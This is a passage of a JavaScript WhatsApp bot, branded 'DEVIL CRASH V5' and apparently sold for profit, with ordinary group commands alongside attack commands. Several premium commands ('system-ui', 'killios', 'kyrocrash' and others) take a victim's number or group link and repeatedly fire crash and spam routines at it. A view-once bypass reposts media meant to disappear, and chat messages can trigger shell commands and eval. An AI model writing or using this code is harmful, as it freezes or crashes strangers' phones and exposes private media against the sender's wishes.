                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await Lubzy.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await Lubzy.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await Lubzy.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await Lubzy.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await Lubzy.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
        m.reply("success")
      }
      break            
//===================================
case 'tovn': {
        if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`reply video/vn dengan caption ${prefix + command}`);
        if (!quoted) return m.reply(`Reply video/vn with caption ${prefix + command}`);
        await sleep(5000);
        let media = await quoted.download();
        let { toAudio } = require('../system/converter');
        let audio = await toAudio(media, 'mp4');
        Lubzy.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
      m.reply(`success send bug to ${Pe}`)
      }
        break
//===================================
case 'hidetag': {
if (!isCreator) return m.reply("only owner access")
if (!m.isGroup) return m.reply("only in group access")

Lubzy.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
m.reply("success")
}
break
//===================================
case 'kick': {
if (!isCreator) return m.reply("only owner access")
if (!m.isGroup) return m.reply("only in group access")
if (!isBotAdmins) return m.reply("only bot admin access")
if (!isAdmins) return m.reply("only admin group access")

let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Lubzy.groupParticipantsUpdate(from, [users], 'remove')
m.reply("success")
}
break
//===================================
case 'linkgroup': case 'linkgc': {
if (!isCreator) return m.reply("only owner access")
if (!m.isGroup) return m.reply("only in group access")
if (!isBotAdmins) return m.reply("only bot admin access")

let responsegg = await Lubzy.groupInviteCode(from)
Lubzy.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
m.reply("success")
}
break
//===================================
case 'resetlinkgc':
if (!isCreator) return m.reply("only owner access")
if (!m.isGroup) return m.reply("only in group access")
if (!isBotAdmins) return m.reply("only bot admin access")

Lubzy.groupRevokeInvite(from)
m.reply("success")
break
//===================================
case 'public': {
if (!isCreator) return m.reply("only owner access")
Lubzy.public = true
m.reply("success")
}
break
//===================================
case 'self': case 'private': {
if (!isCreator) return m.reply("only owner access")
Lubzy.public = false
m.reply("success")
}
break
//===================================
case 'sticker': case 's':
 if (!quoted) return m.reply(`Reply Image or Video with command ${prefix + command}`)
if (/image/.test(mime)) {

let media = await quoted.download()
let encmedia = await Lubzy.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('max 10s')
let media = await quoted.download()
let encmedia = await Lubzy.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
return m.reply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`)
}
m.reply("success")
break
//===================================
case'totag':{
        if (!isAdmins) return reply("only admin group access");
        if (!m.isGroup) return reply("only in group access");
        if (!m.quoted) return reply(`reply pesan dengan caption ${prefix + command}`);
        const groupMetadata = await Lubzy.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        Lubzy.sendMessage(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map((a) => a.id)
           }, { quoted: m });
           m.reply("success")
         }
        break
//===================================
case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return m.reply("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return m.reply("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return m.reply("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await Lubzy.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await Lubzy.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  m.reply("success")
}
break
//===================================
//===================================
case 'system-ui': {
if (!isPremium) return m.reply("only premium access")
if (!q) return m.reply(`Example Use:\n ${prefix + command} 91xxx`)
const Pe = qtext.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`success send bug to ${Pe}`)
for (let r = 0; r < 20; r++) {
await DocCursor(Pe)
await MSGSPAM(Pe)
await NativeC(Pe)
}
}
break
case 'ui-freeze': {
if (!isPremium) return m.reply("only premium access")
if (!q) return m.reply(`Example Use:\n ${prefix + command} 91xxx`)
const Pe = qtext.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`success send bug to ${Pe}`)
for (let r = 0; r < 20; r++) {
await DocCursor(Pe)
await MSGSPAM(Pe)
await NativeC(Pe)
}
}
break
case 'force-system': {
if (!isPremium) return m.reply("only premium access")
if (!q) return m.reply(`Example Use:\n ${prefix + command} 91xxx`)
const Pe = qtext.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`success send bug to ${Pe}`)
for (let r = 0; r < 20; r++) {
await DocCursor(Pe)
await MSGSPAM(Pe)
await NativeC(Pe)
}
}
break
case 'killios': {
if (!isPremium) return m.reply("only premium access")
if (!q) return m.reply(`Example Use:\n ${prefix + command} 91xxx`)
const Pe = qtext.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`success send bug to ${Pe}`)
await KillIos(Pe)
}
break

case 'devilcrashv5': {
if (!isPremium) return m.reply("only premium access")
if (!q) return m.reply(`Example Use:\n ${prefix + command} 91xxx`)
const Pe = qtext.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`success send bug to ${Pe}`)
for (let r = 0; r < 20; r++) {
await DocCursor(Pe)
await MSGSPAM(Pe)
await NativeC(Pe)
}
}
break

case 'kyrocrash': {
if (!isPremium) return m.reply("Features can be accessed by Premium only")
if (!q) return m.reply(`Wrong Usage.\nExample : ${prefix + command} https://chat.whatsapp.com/`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let Pe = await Lubzy.groupAcceptInvite(result);
await sleep(1000)
m.reply(`success send bug to ${Pe}`)
await Carousel(Pe)
await Carousel(Pe)
await Carousel(Pe)
}
break

//===================================
case "owner": {
let namaown = `DEVIL-DEVELOPER`
let nomor = "916001736850"
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
					"contactMessage": {
						"displayName": `${namaown}`,
						"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${nomor}:+${nomor}\nitem1.m.chat-ABLabel:Ponsel\nm.chat-WA-BIZ-DESCRIPTION:OWNER\nm.chat-WA-BIZ-NAME: [[ DEVIL CRASH OFFICIAL ]]\nEND:VCARD`,
					}
				}), {
					userJid: m.chat,
					quoted: m
				})
Lubzy.relayMessage(m.chat, contact.message, {
					messageId: contact.key.id
				})
}
break
//===================================
case 'tqto': {
let tqto = `
\`𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗗𝗘𝗩𝗜𝗟 𝗖𝗥𝗔𝗦𝗛 𝗩5\`
Devil Developer`
await Lubzy.sendMessage(m.key.remoteJid, {
     image: { url: global.fotonjr },
     caption: panelmenu,
     footer: "DEVIL CRASH V5 - DEVIL CRASH OFFICIAL",
     buttons: [ 
         { buttonId: `.owner`,
          buttonText: {
          displayText: '𝗕𝗨𝗬 𝗦𝗖𝗥𝗜𝗣𝗧 𝗩𝗩𝗜𝗣' 
          }, type: 1 },
         { buttonId: `.menu`,
          buttonText: {
          displayText: '𝗞𝗘𝗠𝗕𝗔𝗟𝗜 𝗞𝗘 𝗔𝗪𝗔𝗟'
          }, type: 1 }
     ],
     headerType: 1,
     viewOnce: true
 },{ quoted: m })
}
break
//===================================
default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply('*ONLY DEVELOPER*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
//===================================
if (budy.startsWith('$')) {
if (!isCreator) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//===================================
}
} catch (err) {
Lubzy.sendMessage(m.chat, {text: require('util').format(err)}, {quoted: m})
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//===================================
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//===================================

/*

    Shared By @DEVIL
    YT : @DEVIL999

*/